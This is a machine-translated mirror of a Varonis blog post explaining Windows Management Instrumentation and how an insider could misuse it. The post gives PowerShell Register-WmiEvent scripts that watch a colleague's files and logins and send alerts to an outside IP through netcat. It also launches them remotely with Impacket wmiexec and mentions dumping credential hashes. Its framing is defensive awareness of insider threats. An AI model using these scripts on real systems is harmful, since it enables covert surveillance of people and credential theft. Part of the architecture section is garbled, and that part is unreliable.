<!doctype html>
<html class="no-js" lang="zh-CN">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🔢 🔸 🤘 Windows管理规范（WMI）指南：了解WMI攻击 🏨 📷 ✈️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Windows Management Instrumentation（WMI）是PowerShell子系统，使管理员可以访问功能强大的系统监视工具。该工具包被认为是一种快速有效的系统管理工具，但并非所有人都将其用于良好目的：在它的帮助下，内部人员可以监视其他员工。知道此WMI漏洞可以更轻松地检测和应...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Windows管理规范（WMI）指南：了解WMI攻击</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windows Management Instrumentation（WMI）是PowerShell子系统，使管理员可以访问功能强大的系统监视工具。该工具包被认为是一种快速有效的系统管理工具，但并非所有人都将其用于良好目的：在它的帮助下，内部人员可以监视其他员工。知道此WMI漏洞可以更轻松地检测和应对内部威胁。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在本文中，我们将研究什么是WMI工具，为什么需要它们，以及如何使用它们来跟踪系统中的内部人员活动。我们还编辑了有关WMI事件和内部间谍的更详细指南，您可以</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">免费下载</font></a><font style="vertical-align: inherit;">该指南</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 简短回顾：WMI有什么用？</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们举一个具体的例子。</font><font style="vertical-align: inherit;">使用WMI，例如，您可以请求位于特定目录中的所有大型Excel文件，然后在每次创建给定大小（例如1 MB）的文件时收到通知。</font><font style="vertical-align: inherit;">该</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册-WmiEvent cmdlet可以</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">你</font></a><font style="vertical-align: inherit;">做这一切，在PowerShell中单一，没有太多复杂的线条。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI可以很好地服务于许多目的，但它也可以成为恶意内部人员活动的工具。</font><font style="vertical-align: inherit;">您可以轻松想象一个有爱德华·斯诺登习惯的人如何使用WMI监视他的同事。</font><font style="vertical-align: inherit;">为此，他甚至不需要专门的技术知识。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
假设我们的假设内部人员“偶然地”发现他的同事Lex定期下载大型Excel文件，其中包含社会保险号和客户的其他个人数据。</font><font style="vertical-align: inherit;">在这种情况下，我们不起眼的内部人员可以构建如下内容：</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:’ and targetInstance.Extension =’xlsx’” -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
此代码查询</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIM_DataFile</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象</font><font style="vertical-align: inherit;">以访问有关在指定目录中创建Excel文件的信息，然后开始执行脚本块。</font><font style="vertical-align: inherit;">在本文结尾处，我们将仔细研究在假设的内部人员情况下此场景块的外观。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows管理工具包用于什么？</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在我们继续探索内部人员如何使用WMI进行跟踪之前，值得注意的是它有许多合法用途。</font><font style="vertical-align: inherit;">该系统的全球目标是将公司网络中设备和应用程序的所有控件整合在一起。</font><font style="vertical-align: inherit;">因此，可以使用WMI：</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 收集有关本地和远程计算机系统状态的信息 </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程计算机和应用程序的安全设置</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置和编辑系统属性</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置和编辑授权用户和组的权限</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象的代码执行和序列化（</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一种“类固醇上的SSH”</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分配和编辑驱动器标签</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建过程时间表</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">备份对象存储库</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用和禁用错误日志记录</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
可以使用PowerShell和WMI（WMI命令行界面）访问所有这些功能。</font><font style="vertical-align: inherit;">如您所见，WMI具有各种各样的应用程序，并且该系统允许您跟踪和编辑计算机网络上的许多不同参数。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows管理规范架构</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI工具箱是Windows操作系统的一部分，并且已从Windows 2000开始预安装在所有操作系统上。WMI由以下组件组成：</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI服务</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是Windows上WMI系统的实现。</font><font style="vertical-align: inherit;">该过程以“ Windows Management Instrumentation”的名称出现，并且是WMI提供程序，WMI存储库和管理应用程序之间的链接。</font><font style="vertical-align: inherit;">当您打开计算机时，此过程将自动开始。</font></font></li>
<li><strong> </strong> —        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> —  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> —   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CMI对象管理器</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个位于管理应用程序和WMI提供程序之间的系统。</font><font style="vertical-align: inherit;">她从这些提供者处请求数据，然后将其传输到应用程序。</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI API</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行这些操作，并为应用程序提供对WMI基础结构的访问权限，而不必依赖于所使用的设备类型。</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI使用者</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个通过对象管理器向对象发送请求的实体。</font><font style="vertical-align: inherit;">通常，WMI使用者是运行该应用程序或PowerShell脚本的监视应用程序，例如PRTG Network Monitor。</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发出WMI请求</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
执行WMI请求的最简单方法是在标准Windows命令行上运行WMIC。</font><font style="vertical-align: inherit;">请按照以下步骤获取有关本地计算机上使用的处理器的信息：</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开命令提示符</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键入WMIC以调用该程序，然后按Enter。 </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMIC命令提示符窗口将出现。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在命令提示符下，您可以执行WMI请求。</font><font style="vertical-align: inherit;">最简单的请求是查看有关本地处理器的信息，可以使用以下命令执行该信息：</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果将显示在命令行上。</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
下面将讨论的几乎所有命令都以这种方式执行。</font><font style="vertical-align: inherit;">但是，WMI允许您接收比处理器信息更多的详细信息，包括从远程计算机和应用程序中获得的信息。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于使用WMI事件监视系统的研讨会</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在本节中，我们将研究如何使用WMI执行命令并监视远程计算机上的进程。</font><font style="vertical-align: inherit;">此类技术可以用作</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户和实体行为分析系统（UEBA）的一部分，</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以自动监视整个系统的过程并</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查内部威胁</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">内部威胁</font></a><font style="vertical-align: inherit;">由可疑行为或异常事件证明。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用Impacket的wmiexec功能</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在WMI中，除了事件管理之外，您还可以执行各种功能。在其中，您可以在本地和远程计算机上的Windows窗口中启动进程并执行命令。为了娱乐，请尝试</font><font style="vertical-align: inherit;">在PowerShell会话中</font><font style="vertical-align: inherit;">输入</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流程调用create'notepad.exe'命令以打开旧的Microsoft文本编辑器。它使用WMI随附的精彩的Wmic命令行工具。太好了吧？</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
如果添加了/ Node：选项，然后添加了远程Windows计算机的名称，则只要我具有适当的权限，就可以在其上运行记事本。显然，从实际的角度来看，wmic是系统管理员必不可少的工具。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在开始怨恨之前：我知道有等效的</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell cmdlet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。但是，我发现wmic语法更容易记住。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
如果可以使用WMI创建简单且不可见的伪Shell，那将是非常不错的。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 用wmiexec创建的一个隐藏的伪shell，</font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
幸运的是，可以在Impacket中完成。在Amazon测试环境中，我使用了我最喜欢的</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过Linux虚拟机访问WMI。 Wmiexec提供了创建伪外壳程序的功能：每次在客户端输入命令时，都会在目标计算机上创建一个单独的外壳程序来执行此命令。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
psexec和smbexec都使用Windows服务在远程系统上运行命令。 Smbexec会以静默方式运行，因为它会快速创建然后删除该服务，而psexec相反会使它看不见。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 wmiexec工具直接运行cmd.exe来远程执行命令。</font><font style="vertical-align: inherit;">可以在事件查看器中找到创建的命令。</font><font style="vertical-align: inherit;">请注意，我们避免了</font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
吸引人的</font><font style="vertical-align: inherit;">Windows服务，</font><font style="vertical-align: inherit;">而wmiexec工具完全不影响服务，而是使用上述WMI功能直接启动该过程。</font><font style="vertical-align: inherit;">在寻找威胁的可能来源时，安全专家很少从WMI开始，而服务通常是开始寻找攻击证据的好地方。</font><font style="vertical-align: inherit;">好招，wmiexec！</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用WMI事件监视用户</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
当我以为自己很聪明并且正在使用WMI进行实验而使自己感到很有趣时，事实证明，参与渗透测试的人很早就了解了一切的工作原理。您肯定需要阅读</font><font style="vertical-align: inherit;">2015年黑帽大会</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">马特·格雷伯（Matt Graeber）的</font><font style="vertical-align: inherit;">精彩</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">演讲</font></a><font style="vertical-align: inherit;">，他在演讲中谈到攻击者如何将WMI及其整个事件库变成黑客工具。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在我的故事中，我想象一个内部人士la Snowden拥有一些技术知识，但没有深厚的黑客智慧，并且受到其他员工的信任。此人不需要了解有关WMI的所有知识。他只需要知道在远程计算机上工作和触发事件所需的条件。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
除了文件对象外，还有另一类可以使用WMI学习的有趣对象，即</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_LogOnSession</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。通过查询此基本Windows对象，可以查找当前在系统上的用户。然后，当新用户远程登录时，可以使用Register-WmiEvent操作脚本块运行PowerShell脚本。明白了吗？攻击者每次监视的用户登录到目标系统时，都可以收到通知。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
这是我素描的内容：</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" –Action $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
下一个问题是如何对脚本块的执行进行编程。我幻想中的一位神秘内部人士对特定用户Cruell感兴趣。我们的恶棍正在慢慢监视Cruella，现在计划使用收集到的信息来破解她的工作账目。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
脚本块的任务是检查谁已登录并确定是否为Cruella。我为此目的编写了几行PowerShell代码，但这显然不是最佳方法。我不使用传输到脚本块的事件信息，即有关新用户的信息。我遇到了障碍，这些原因我目前无法理解。这需要比我们假设的内部人员拥有或准备掌握的更多的技术知识。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
相反，我只是遍历了gwmi Win32_Process返回的用户列表（尝试在PowerShell会话中运行此cmdlet）并将它们与Cruell参数进行匹配。</font><font style="vertical-align: inherit;">您可以欣赏我的最终决定：</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Register-WmiEvent允许您保持隐身性，因为它仅在再次登录时才启动，而不是定期请求Win32_Process对象，这很明显。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
请记住，我们的内部人员试图不引起注意。</font><font style="vertical-align: inherit;">她可以通过psexec，smbexec或wmiexec（最不显眼的方式）访问远程系统。</font><font style="vertical-align: inherit;">但是，她并不需要经常在受害者的系统中来回漫游。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
这是使用WMI事件的妙处。</font><font style="vertical-align: inherit;">您可以等待Register-WmiEvent发出的通知，然后从容应对。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat和WMI集成</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是脚本如何将Cruella登录的热门消息带到目标计算机？</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
如果您注意到我使用了上面的Netcat命令，则可以给自己一个加分。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个众所周知的通用实用程序，可让您建立连接（恶意软件可选）。使用它，您可以执行反向连接，也可以仅通过网络发送消息。我抓住了第二次机会。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上面的脚本在待机模式下发送Netcat消息，并显示“ Cruella已登录”。任务完成。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您可以想象我们的骗子如何使用</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">secretsdump Impacket工具</font></a><font style="vertical-align: inherit;">转储哈希</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，破解Cruella凭据哈希，然后使用Cruella权限启动wmiexec，以搜索更有价值的数据。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Register-WmiEvent代码可以直接运行。</font><font style="vertical-align: inherit;">注意显示的事件标识符</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对WMI监视进行故障排除</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
作为此示例的一部分，我想远程运行（使用wmiexec）一个有用的程序，该程序将在特定用户（即Cruella）登录时提醒我。之后，我可以安全地重置并破解她的凭据。这将是最不起眼的方式-远程访问并且没有文件。乍一看来，唯一的问题是WMI事件的暂时性。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
因此，我需要在PowerShell命令行中使用–noexit参数将我的淫秽的Register-WMIEvent（如下）封闭起来，以确保在Register-Event之后保存PowerShell会话，并因此保存该事件。</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
当我开始进行此工作时，我意识到必须“转换”特殊字符（例如$，“和|”），并将它们作为文字直接传递给PowerShell。</font><font style="vertical-align: inherit;">另一个令人头疼的问题是：由于导致分析错误，我最终不得不放弃使用垂直线。</font><font style="vertical-align: inherit;">不要问。</font><font style="vertical-align: inherit;">渐渐地，我来到了这段长长的代码：</font></font><br>
<br>
<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
根据目标系统中的Windows事件日志，它看起来很有希望，并且似乎可以正常工作。</font><font style="vertical-align: inherit;">但是，仔细查看后，我发现它不起作用。</font><font style="vertical-align: inherit;">我相信最终我可以将其转换为正确的格式，但是为此，我将需要时间和咖啡，以及大量的咖啡。</font><font style="vertical-align: inherit;">还有另一种选择，它不太显眼，也没有一点没有文件：您可以使用smbclient传输脚本，然后直接在目标计算机上运行它。</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 在我看来，远程执行复杂的Register-Event cmdlet绝对正确。</font><font style="vertical-align: inherit;">但这没有用。</font><font style="vertical-align: inherit;">好吧，</font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
。，在这个阶段，我的假设是，一个聪明但经验不足的内部人员可以轻松地使用WMI临时事件进行秘密监视。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为什么要使用恒定事件进行观察？ </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
正确的同时需要更深入的知识是使用持久性WMI事件。永久性WMI事件虽然有些复杂，但它不仅比临时事件更有效地用作内部间谍工具，而且还使您可以更有效地监视内部威胁。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
研究持续性事件将花费一些时间，但是它们代表了对大型系统实施严格监控系统的最有效方法。它们具有比临时WMI事件更多的功能。它们还可以用于警告您非标准的恶意活动，例如DNS隧道或违反</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">零信任</font></a><font style="vertical-align: inherit;">策略</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我花了几天的时间研究持久性事件，发现PowerShell具有一个特殊的cmdlet，该cmdlet简化了创建事件筛选器，使用者和筛选器与使用者之间的WMI对象的过程。众所周知，PowerShell为管理员提供了很多简化工作的机会。不幸的是，此示例显示了攻击者如何利用这些强大功能。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
内部人员在目标系统上创建一个常量事件，从而使自己摆脱了在shell会话中出现的需要。该事件将一直保留在那里或直到被明确删除为止。您可以</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">在此处</font></a><font style="vertical-align: inherit;">阅读有关如何执行此操作的更多信息</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但总体而言，该过程与我上面针对临时事件所做的过程类似。</font><font style="vertical-align: inherit;">黑客需要做的最后一件事是将事件过滤器与事件使用者相关联。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我同意，对于突然决定成为邪恶黑客的普通员工来说，这看起来太酷了。</font><font style="vertical-align: inherit;">为了引起兴趣，我阅读了各种</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">论坛，</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并发现许多人都无法使WMI持续事件正常工作。</font><font style="vertical-align: inherit;">但是，这并没有超出我们的“ Snowden”和其他精明的系统管理员的能力，他们决定改用阴暗的一面。</font></font><br>
<br>
